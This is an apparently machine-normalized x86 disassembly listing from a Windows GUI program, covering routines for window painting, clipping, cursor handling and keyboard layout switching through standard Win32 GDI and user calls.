push sub_4423d3
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413de4
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_442404
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413e40
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_413de4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4129b0
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_413de4
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41cf40
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_4129b0
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41cf40
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4129b0
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43c734
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43efc4
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_442634
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43c734
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4445f8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4445f8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43efc4
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43efc4
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43c734
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_442634
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_413de4
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_442788
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4422ac
jmp r-xdata
mov eax ebx
call sub_441328
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4428da
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4445f8
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43efc4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_442788
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4445f8
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_4428e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442908
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44297c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44299c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4429bc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4429e0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442a04
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442a28
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442a4c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42c584
mov edi eax
mov eax edi
call sub_42c664
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41dc20
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4445f8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42c7fc
jmp r-xdata
sub_442ad4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43f8f8
test bl bl
je r-xdata
mov eax edi
call sub_444908
mov eax edi
call sub_444500
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_444500
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_442b94
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43f554
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_442be4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_444908
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_440eb8
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_40349c
sub_442c2c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43d93c
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_441ee4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45da68
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bf50
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_442d7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_442e5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442e62
lea eax [ ebp - 0x4 ]
call sub_404074
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4445f8
mov dl [ ebx + 0x184 ]
call sub_44929c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bec8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407edc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bcc8
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bcc8
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bcc8
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_442e68
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442ef2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442ef9
lea eax [ ebp - 0x4 ]
call sub_404074
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45bec8
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407edc
test eax eax
je r-xdata
mov eax ebx
call sub_4445f8
mov dl 0x1
call sub_449280
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_442f54
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_4129a0
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43efc4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_442fa4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_442fd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_40349c
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_40349c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_443018
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43efc4
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_443070
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a5ec
mov edx [ r-xdata ]
call sub_403450
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_4430a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_413de4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4430cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_4445f8
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_443128
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_443094
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413de4
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_443168
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4056f8
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4056f8
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_4431d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44327c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443283
lea eax [ ebp - 0x4 ]
call sub_4056e0
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43baa4
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_4032a0
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4056e0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_40349c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4056f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ edi + 0x178 ] eax
sub_44328c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_440e90
xor edx edx
push ebp
push sub_44334e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_40349c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443355
mov eax [ ebp - 0x4 ]
call sub_440e98
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_443355
mov eax [ ebp - 0x4 ]
call sub_455244
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43e058
sub_4433a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031e8
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43fc84
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44340a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43e058
sub_443424
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44344c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_455244
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45514c
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_40349c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44344c
test al al
jne r-xdata
sub_4434b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44344c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445764
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4434e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44344c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445764
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44350c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_443534
push ebx
push esi
push edi
push ebp
push ecx
